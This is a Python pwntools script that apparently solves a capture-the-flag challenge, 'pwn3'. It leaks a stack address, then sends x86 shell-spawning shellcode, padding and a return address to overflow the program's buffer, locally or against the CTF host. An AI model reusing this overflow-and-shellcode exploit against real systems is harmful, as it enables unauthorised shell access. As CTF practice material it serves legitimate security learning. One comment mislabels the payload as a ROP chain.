#!/usr/bin/env python
import pwn
import time
import sys


# Constants
BUFFERSIZE = 242
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\xC3"
OVERFLOW = "A" * (BUFFERSIZE - len(SHELLCODE))

def usage():
    print "Usage: %s [FLAGS]" % sys.argv[0]
    print "\nFLAG\t\t\tOption"
    print "-l\t\t\tLocal (Default)"
    print "-r\t\t\tRemote\n"
    return

def setup(argv = ""):
    #Local Exploit
    if argv == "-l" or argv == "":
        r = pwn.process("./pwn3")

    #Remote Exploit
    elif argv == "-r":
        r = pwn.remote("pwn.ctf.tamu.edu", 4323)

    #Usage not correct
    else:
        usage()
        return

    #Build Payload and EXPLOIT!!!
    exploit(r, buildPayload(r))

def buildPayload(r):
    # Build payload
    payload = ""
    payload += SHELLCODE	              # Add Shellcode
    payload += OVERFLOW			            # Add overflow of 'A'
    payload += getStackAddress(r)	      # Parse address and add to payload
    return(payload)

def getStackAddress(r):
    r.recvuntil('0x')
    address = r.recvuntil('!')		       # Address with exclamation
    address = address.split('!')[0]	     # Strip exclamation off of address
    address = int(address, 16)		       # Convert from string to hex integer
    address = pwn.p32(address)		       # Pack into Little Endian address string
    return(address)

def exploit(r, payload):
    r.recv()				                     # Revieve until prompted for input
    r.sendline(payload)			             # Send our payload (stackoverflow and ROPChain)
    r.interactive()			                 # Keep the shell alive with Interactive command

if __name__ == "__main__":
    if len(sys.argv) > 2:
        usage()
    elif len(sys.argv) == 2:
        setup(sys.argv[1])
    else:
        setup()
